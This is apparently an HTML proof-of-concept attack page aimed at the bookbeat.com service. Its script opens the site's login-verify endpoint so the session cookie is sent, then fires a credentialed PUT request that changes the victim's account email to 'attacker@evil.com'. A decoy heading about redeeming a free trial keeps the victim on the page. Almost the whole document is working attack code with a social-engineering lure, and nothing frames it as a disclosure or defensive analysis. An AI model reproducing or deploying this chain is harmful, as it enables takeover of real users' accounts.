<script>
  // Step 1: open verify endpoint as top-level GET nav
  // SameSite=Lax → bb_refreshtoken cookie IS sent ✓
  var win = window.open(
    "https://www.bookbeat.com/api/next/login/verify",
    "_blank"
  );

  // Step 2: wait for session to establish, then fire email change
  setTimeout(function() {
    try {
      // Same-site: www.bookbeat.com and challenge.api.bookbeat.com
      // share the .bookbeat.com cookie domain → session valid here too
      win.fetch("https://challenge.api.bookbeat.com/api/users/email", {
        method:      "PUT",
        credentials: "include",
        headers: {
          "Content-Type": "application/json",
          "Bb-Client":    "bookbeatweb",
          "Bb-Market":    "uk",
        },
        body: JSON.stringify({ newemail: "attacker@evil.com" }),
      });
    } catch(e) {
      // window closed or cross-origin blocked — chain still fired Step 1
    }
  }, 2000);
</script>

<!-- Decoy content to keep victim on page -->
<h1>Redeeming your free trial...</h1>
